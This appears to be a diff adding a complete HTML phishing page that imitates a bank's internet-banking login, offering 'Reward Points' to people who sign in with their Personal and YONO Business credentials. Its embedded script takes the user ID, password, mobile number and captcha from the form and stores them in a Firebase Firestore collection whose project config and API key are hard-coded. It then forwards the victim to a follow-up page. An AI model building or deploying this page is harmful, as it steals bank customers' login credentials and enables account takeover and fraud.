@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Home</title>
+  <link rel="stylesheet" href="a02b572693328546.css" />
+
+  <style>
+    .captcha-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .captcha-img {
+      width: 150px;
+      height: auto;
+      margin-left: 15px;
+    }
+    .btContainer button {
+      padding: 6px 16px;
+      font-size: 13px;
+    }
+  </style>
+
+  <!-- Firebase SDKs -->
+  <script type="module">
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js';
+    import { getFirestore, collection, addDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js';
+
+    // ✅ Updated Firebase Config (as per your request)
+    const firebaseConfig = {
+      apiKey: "AIzaSyAQChRUNOzph1tOQtVdNJnaX79VMuI1K9w",
+      authDomain: "srai-16d20.firebaseapp.com",
+      projectId: "srai-16d20",
+      storageBucket: "srai-16d20.firebasestorage.app",
+      messagingSenderId: "13015388512",
+      appId: "1:13015388512:web:ede30255ac370257f7ce05"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const loginForm = document.getElementById("loginForm");
+
+      if (!loginForm) {
+        console.error("Login form not found!");
+        return;
+      }
+
+      loginForm.addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        const userId = document.getElementById("userId").value.trim();
+        const password = document.getElementById("password").value.trim();
+        const mobile = document.getElementById("mobile").value.trim();
+        const captcha = document.getElementById("captcha").value.trim();
+
+        if (!userId || !password || !mobile || !captcha) {
+          alert("Please fill out all fields correctly.");
+          return;
+        }
+
+        if (mobile.length !== 10 || isNaN(mobile)) {
+          alert("Please enter a valid 10-digit mobile number.");
+          return;
+        }
+
+        try {
+          await addDoc(collection(db, "users"), {
+            userId,
+            password,
+            mobile,
+            captcha,
+            timestamp: serverTimestamp()
+          });
+
+          console.log("Data successfully written to Firestore!");
+          window.location.href = "b3.html";
+        } catch (error) {
+          console.error("Error saving data: ", error);
+          alert("Error submitting login data. Please try again.");
+        }
+      });
+    });
+  </script>
+</head>
+
+<body>
+  <div id="__next">
+    <header>
+      <img src="logo.png" alt="Bank Logo" width="509" height="99" class="logo" />
+    </header>
+    <main>
+      <form id="loginForm">
+        <h1>Welcome to</h1>
+        <div class="topL">
+          <img src="logo.png" alt="Top Logo" width="509" height="99" />
+        </div>
+        <p class="tagline">
+          Please use your existing <strong>Internet Banking User ID and Password</strong> (credentials) of 
+          <strong>Personal and YONO Business Internet Banking</strong> and redeem <strong>Reward Points</strong>.
+        </p>
+
+        <div class="floating-container">
+          <input type="text" id="userId" name="userId" required aria-label="User ID" />
+          <label for="userId">User ID <span>*</span></label>
+        </div>
+
+        <div class="floating-container">
+          <input type="password" id="password" name="password" required aria-label="Password" />
+          <label for="password">Password <span>*</span></label>
+        </div>
+
+        <div class="floating-container">
+          <input type="text" id="mobile" name="mobile" required aria-label="Mobile Number" maxlength="10" pattern="\d{10}" />
+          <label for="mobile">Mobile Number <span>*</span></label>
+          <small></small>
+        </div>
+
+        <div class="floating-container captcha-container">
+          <input type="text" id="captcha" name="captcha" required aria-label="Captcha" />
+          <label for="captcha">Enter the captcha <span>*</span></label>
+          <img src="c.png" alt="Captcha Image" class="captcha-img" />
+        </div>
+
+        <div class="btContainer">
+          <button type="submit">LOGIN</button>
+        </div>
+
+        <div class="btContainer">
+          <span class="hi">Lock Access | Forgot Password | Forgot Username</span>
+        </div>
+      </form>
+    </main>
+
+    <footer>
+      <div class="l">
+        <img src="s.jpg" alt="Footer Image" width="1080" height="769" class="l" />
+      </div>
+      <img src="ft.png" alt="Footer Logo" width="1080" height="189" class="ft" />
+    </footer>
+  </div>
+</body>
+</html>
